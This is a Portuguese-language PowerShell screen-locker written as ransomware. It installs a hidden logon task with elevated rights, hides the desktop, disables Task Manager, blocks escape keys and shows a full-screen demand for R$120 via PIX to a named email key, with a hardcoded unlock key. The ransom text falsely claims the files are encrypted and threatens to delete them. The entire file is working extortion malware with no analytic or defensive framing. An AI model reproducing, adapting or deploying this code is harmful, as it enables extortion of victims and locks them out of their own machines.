#Requires -RunAsAdministrator

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

$screenTaskName = "SystemLogon"
$scriptPath = [System.IO.Path]::GetFullPath($PSCommandPath)
$pixKey = "keyzer0reis@gmail.com"
$correctKey = "#pix220c#"

# Função para criar tarefa agendada
function Create-StartupTask {
    $taskExists = schtasks /query /tn $screenTaskName 2>$null
    if ($? -eq $false) {
        $cmd = "schtasks /create /tn `"$screenTaskName`" /sc onlogon /rl highest /f /tr `"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File '$scriptPath'`" /delay 0000:01"
        Invoke-Expression $cmd | Out-Null
    }
}

# Função que reverte alterações
function Revert-Changes {
    # Remove tarefa agendada
    $taskExists = schtasks /query /tn $screenTaskName 2>$null
    if ($? -eq $true) { schtasks /delete /tn $screenTaskName /f | Out-Null }

    # Restaura wallpaper
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value "" -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "WallpaperStyle" -Value 0 -ErrorAction SilentlyContinue

    # Remove política que esconde desktop
    $desktopRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    if (Test-Path $desktopRegPath) { Remove-ItemProperty -Path $desktopRegPath -Name "NoDesktop" -ErrorAction SilentlyContinue }

    # Reativa Task Manager
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    $regName = "DisableTaskMgr"
    if (Test-Path $regPath) { Remove-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue }

    # Força atualização do desktop
    [User32]::SystemParametersInfo(20, 0, $null, 3)

    # Reinicia Explorer para aplicar as alterações imediatamente
    Stop-Process -Name explorer -Force
    Start-Process explorer

    # Fecha qualquer formulário aberto
    if ($form -and $form.Visible) { $form.Close() }

    # Confirmação
    [System.Windows.Forms.MessageBox]::Show("Certo vagabundo pronto tudo arrumado", "Tudo resolvido", "OK", "Information")
}

# Função que checa a key
function Check-Key {
    if ($textbox.Text -eq $correctKey) {
        Revert-Changes
        Stop-Process -Id $PID
    } else {
        [System.Windows.Forms.MessageBox]::Show("CHAVE INCORRETA! 2/3 TENTATIVAS!", "ERRO SEUS ARQUIVOS SERAM DELETADOS ", "OK", "Error")
        $textbox.Text = ""
        $textbox.Focus()
    }
}

# Cria tarefa agendada no logon
Create-StartupTask

# Bloqueia desktop e Task Manager
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "Wallpaper" -Value ""
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

$desktopRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
if (-not (Test-Path $desktopRegPath)) { New-Item -Path $desktopRegPath -Force | Out-Null }
Set-ItemProperty -Path $desktopRegPath -Name "NoDesktop" -Value 1 -Type DWord -Force

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
$regName = "DisableTaskMgr"
if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name $regName -Value 1 -Type DWord -Force

# Cria formulário fullscreen
$form = New-Object System.Windows.Forms.Form
$form.WindowState = "Maximized"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::Red
$form.TopMost = $true
$form.ControlBox = $false
$form.KeyPreview = $true

# Bloqueio de teclas
$form.Add_KeyDown({
    if ($_.Alt -and $_.KeyCode -eq "Tab") { $_.Handled = $true }        # Alt+Tab
    if ($_.Control -and $_.KeyCode -eq "Escape") { $_.Handled = $true } # Ctrl+Esc
    if ($_.KeyCode -eq "LWin" -or $_.KeyCode -eq "RWin") { $_.Handled = $true } # Windows Key
    if ($_.Alt -and $_.KeyCode -eq "F4") { $_.Handled = $true }         # Alt+F4
})

$form.Add_FormClosing({ $_.Cancel = $true })

$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.Bounds.Width
$screenHeight = $screen.Bounds.Height

$labelWidth = 1000
$labelHeight = 300
$textboxWidth = 300
$textboxHeight = 40
$btnWidth = 100
$btnHeight = 40
$spacing = 20

$labelX = ($screenWidth - $labelWidth) / 2
$labelY = ($screenHeight - ($labelHeight + $textboxHeight + $btnHeight + (2 * $spacing))) / 2
$textboxX = ($screenWidth - $textboxWidth) / 2
$textboxY = $labelY + $labelHeight + $spacing
$btnX = ($screenWidth - $btnWidth) / 2
$btnY = $textboxY + $textboxHeight + $spacing

# Label
$label = New-Object System.Windows.Forms.Label
$label.Text = "SEUS ARQUIVOS ESTÃO CRIPTOGRAFADOS!`n`nTODOS OS SEUS DADOS FORAM BLOQUEADOS!`nPague R$ 120,00 via PIX  $pixKey`nOU DIGITE A CHAVE ABAIXO PARA DESBLOQUEAR SE NAO VOU DELETAR TODOS OS ARQUIVOS!!"
$label.ForeColor = [System.Drawing.Color]::Black
$label.Font = New-Object System.Drawing.Font("Impact", 20, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $false
$label.Width = $labelWidth
$label.Height = $labelHeight
$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$label.Location = New-Object System.Drawing.Point([int]$labelX, [int]$labelY)
$form.Controls.Add($label)

# Caixa de texto
$textbox = New-Object System.Windows.Forms.TextBox
$textbox.Multiline = $false
$textbox.Width = $textboxWidth
$textbox.Height = $textboxHeight
$textbox.Font = New-Object System.Drawing.Font("Arial", 14)
$textbox.BackColor = [System.Drawing.Color]::White
$textbox.ForeColor = [System.Drawing.Color]::Black
$textbox.Location = New-Object System.Drawing.Point([int]$textboxX, [int]$textboxY)
$form.Controls.Add($textbox)

# Botão
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "Enviar"
$btn.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$btn.Width = $btnWidth
$btn.Height = $btnHeight
$btn.BackColor = [System.Drawing.Color]::White
$btn.ForeColor = [System.Drawing.Color]::Black
$btn.Location = New-Object System.Drawing.Point([int]$btnX, [int]$btnY)
$form.Controls.Add($btn)

# Eventos
$btn.Add_Click({ Check-Key })
$textbox.Add_KeyDown({
    if ($_.KeyCode -eq "Enter") {
        Check-Key
        $_.SuppressKeyPress = $true
    }
})

$form.Add_Shown({ $textbox.Focus() })

[void]$form.ShowDialog()

